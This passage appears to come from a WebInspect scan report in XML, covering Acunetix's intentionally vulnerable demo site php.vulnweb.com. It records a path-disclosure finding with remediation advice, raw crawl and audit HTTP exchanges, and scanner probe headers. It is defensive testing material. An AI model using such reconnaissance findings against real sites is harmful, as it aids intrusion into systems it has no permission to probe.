identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="2351" length="25" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="991928C5937B2E98B55DF77B779F5A58"><![CDATA[GET /listproducts.php HTTP/1.1
Referer: http://php.vulnweb.com/listproducts.php?cat=2
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="991928C5937B2E98B55DF77B779F5A58";PSID="1EFA08AB9E8A0EC09F30D4E7F97ECBB5";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="64";tt="11";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="ed2bbe25";
X-Request-Memo: ID="b4853e3f";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:36 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4819

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
Warning: mysql_fetch_array() expects parameter 1 to be resource, null given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="991928C5937B2E98B55DF77B779F5A58"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/listproducts.php?cat=2</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="991928C5937B2E98B55DF77B779F5A58";PSID="1EFA08AB9E8A0EC09F30D4E7F97ECBB5";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="64";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="35";smi="0";sc="1";ID="ed2bbe25";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="b4853e3f";sc="1";tid="43";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
Warning: mysql_fetch_array() expects parameter 1 to be resource, null given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:36 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4819</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="1EFA08AB9E8A0EC09F30D4E7F97ECBB5"><URL>http://php.vulnweb.com:80/listproducts.php?cat=2</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="1EFA08AB9E8A0EC09F30D4E7F97ECBB5"><![CDATA[GET /listproducts.php?cat=2 HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="1EFA08AB9E8A0EC09F30D4E7F97ECBB5";PSID="8681F4E7C8D52EA34B378320F672FB6F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="a08e533e";
X-Request-Memo: ID="251480da";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:44 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5311

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Paintings</h2><div class='story'><a href='product.php?pic=6'><h3>Thing</h3></a><p><a href='showimage.php?file=./pictures/6.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/6.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=6','comment','width=500,height=400')">comment on this picture</a></p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="1EFA08AB9E8A0EC09F30D4E7F97ECBB5"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>cat=2</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>cat</Name><Value>2</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/categories.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="1EFA08AB9E8A0EC09F30D4E7F97ECBB5";PSID="8681F4E7C8D52EA34B378320F672FB6F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="a08e533e";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="251480da";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Paintings</h2><div class='story'><a href='product.php?pic=6'><h3>Thing</h3></a><p><a href='showimage.php?file=./pictures/6.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/6.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=6','comment','width=500,height=400')">comment on this picture</a></p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
